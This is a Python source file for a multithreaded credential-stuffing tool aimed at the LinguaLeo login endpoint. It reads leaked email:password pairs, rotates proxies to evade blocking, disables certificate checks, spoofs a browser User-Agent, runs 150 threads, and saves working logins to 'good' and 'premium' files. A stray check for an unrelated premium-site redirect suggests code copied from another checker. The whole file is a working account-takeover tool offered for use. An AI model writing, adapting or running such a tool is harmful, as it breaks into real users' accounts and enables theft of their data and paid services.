import requests
import sys, os
import random
import datetime
import threading
import time
from helpers.colors import bcolors
from bs4 import BeautifulSoup as soup

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



class Brute(object):
    def __init__(self):
        self.projectName = "LinguaLeo"
        self.projectFullName = "LinguaLeo only bruteforce"
        self.description = "Author : Pirate2110"
        self.good = 0
        self.bad = 0 
        self.error = 0
        self.projerror = 0
        self.projid = 0
        self.proxytype = "https"
        self.basename = "log.txt"
        self.proxyname = "proxy.txt"
        self.captcha = 0
        self.running = True
        self.timeout = 15
        self.thread_count = 150
        self.today = datetime.datetime.today()
        self.lines = []
        self.lock = threading.Lock()
        self.count_list = 0

    def check(self, login, password):
        try:
            
            if self.proxytype != "burp":
                proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
            else:
                proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36', 'Accept': 'application/json', 'Referer' : 'https://lingualeo.com/ru'}
            s = requests.session()
            
            body = {"type":"mixed","credentials":{"email":login,"password":password}}
            r = s.post("https://lingualeo.com/auth", json=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
            
            #print(r.text)
            if "Incorrect authorization data" in r.text:
                self.bad += 1
            elif "accessToken" in r.text:
                if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
                    self.writelog("good.txt", login + ":" + password)
                else:
                    self.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
                self.good += 1
                #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
            
            else:
                self.projerror += 1
        except Exception as e:
            #print("Error is " + str(e))
            self.error += 1
            self.lines.append(login+':'+password)
     
    def stop(self):
        self.running = False
        print("Work ended", end='\r')
        sys.stdout.flush()

   



    def mult(self):
        with open(self.basename, "r") as tags:
            for line in tags:
                #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                self.lines.append(line.strip())
            print('Count of accounts : ' + str(len(self.lines)))  
            self.count_list = len(self.lines) 
        self.startth()

    def startth(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.work)
            t.start()

    def work(self):
    #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
        while self.running:
            if (len(self.lines) == 0):
                self.stop()
                break

            self.lock.acquire()
            if self.projid == 0:
                print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
            sys.stdout.flush()
            trl = self.lines[0]
            self.lines.pop(0)
            self.lock.release()

            if ":" in trl:
                self.check(trl.split(':')[0], trl.split(':')[1])
            if ";" in trl:
                self.check(trl.split(';')[0], trl.split(';')[1])
            
            time.sleep(1)
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def getproxy(self):
        proxyfile = open(self.proxyname).read().splitlines()
        return random.choice(proxyfile)

    def writelog(self, file, log):
        dirr = self.projectName + "/" + str(self.today.strftime("%m-%d-%H.%M.%S")) + "/" +file
        os.makedirs(os.path.dirname(dirr), exist_ok=True)
        with open(dirr, 'a') as the_file:
            the_file.write(log + '\n')